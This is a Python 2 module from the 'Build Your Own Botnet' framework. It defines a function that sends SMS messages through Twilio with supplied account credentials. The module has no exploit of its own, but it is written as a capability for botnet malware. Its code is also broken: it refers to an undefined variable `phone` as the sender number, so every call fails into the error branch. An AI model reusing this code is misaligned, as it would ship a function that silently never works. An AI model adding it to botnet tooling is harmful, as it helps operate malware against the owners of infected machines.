#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# modules

import util

# globals

packages  = ['twilio']
platforms = ['win32','linux2','darwin']
util.is_compatible(platforms, __name__)
util.imports(packages)

def text_message(account_sid, auth_token, phone_number, message):
    try:
        if 'twilio' in globals():
            phone_number = '+{}'.format(str().join([i for i in str(phone_number) if str(i).isdigit()]))
            cli = twilio.rest.Client(account_sid, auth_token)
            msg = cli.api.account.messages.create(to=phone_number, from_=phone, body=message)
            return "SUCCESS: text message sent to {}".format(phone_number)
	else:
            raise ImportError("missing package 'twilio' is required for module 'phone'")
    except Exception as e:
        return "{} error: {}".format(text_message.func_name, str(e))

